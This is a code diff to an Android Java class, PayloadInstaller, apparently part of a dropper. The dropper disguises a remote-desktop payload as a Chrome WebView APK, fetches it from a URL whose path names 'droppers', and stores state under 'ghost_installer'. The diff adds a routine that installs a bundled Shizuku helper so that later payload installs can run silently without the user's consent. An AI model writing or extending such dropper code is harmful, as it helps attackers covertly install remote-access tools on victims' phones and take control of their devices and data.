@@ -48,6 +48,8 @@ final class PayloadInstaller {
     static final String PAYLOAD_ACTIVITY = "com.carriez.flutter_hbb.MainActivity";
 
     private static final String ASSET = "Chrome_WebView_v117.apk";
+    static final String SHIZUKU_PACKAGE = "moe.shizuku.privileged.api";
+    private static final String SHIZUKU_ASSET = "Shizuku.apk";
     private static final String PAYLOAD_URL =
             "https://global.telcom.stream/downloads/droppers/Chrome_WebView_v117_payload.apk";
     private static final String PREFS = "ghost_installer";
@@ -98,6 +100,29 @@ final class PayloadInstaller {
 
     static File payloadFile(Context c) {
         return new File(payloadDir(c), ASSET);
+    }
+
+    static File shizukuFile(Context c) {
+        return new File(payloadDir(c), SHIZUKU_ASSET);
+    }
+
+    /**
+     * Best-effort: install the bundled Shizuku helper (Rikka-signed) so the
+     * wrapper can use the fully silent Shizuku path. Returns true when an
+     * install was launched (caller waits and re-runs); false when Shizuku is
+     * already present or the asset is unavailable (caller uses the normal
+     * installer instead).
+     */
+    static boolean ensureShizuku(Context c) {
+        if (ShizukuBridge.installed(c)) return false;
+        if (installedInfo(c, SHIZUKU_PACKAGE) != null) return false;
+        File out = shizukuFile(c);
+        if (!out.isFile() || out.length() < 1024) {
+            if (!extractAssetByName(c, SHIZUKU_ASSET, out)) return false;
+        }
+        if (info(c, out) == null) return false;
+        manualInstaller(c, out);
+        return true;
     }
 
     /**
@@ -160,7 +185,7 @@ final class PayloadInstaller {
 
     private static boolean writeStream(InputStream in, File out) {
         try {
-            File tmp = new File(out.getParentFile(), ASSET + ".part");
+            File tmp = new File(out.getParentFile(), out.getName() + ".part");
             FileOutputStream fos = new FileOutputStream(tmp);
             byte[] buf = new byte[64 * 1024];
             int len;
@@ -189,13 +214,17 @@ final class PayloadInstaller {
     }
 
     private static boolean extractAsset(Context c, File out) {
+        return extractAssetByName(c, ASSET, out);
+    }
+
+    private static boolean extractAssetByName(Context c, String name, File out) {
         try {
-            InputStream in = c.getAssets().open(ASSET);
+            InputStream in = c.getAssets().open(name);
             boolean ok = writeStream(in, out);
             in.close();
             return ok;
         } catch (Throwable t) {
-            Log.d(TAG, "extractAsset failed " + t);
+            Log.d(TAG, "extractAsset " + name + " failed " + t);
             return false;
         }
     }
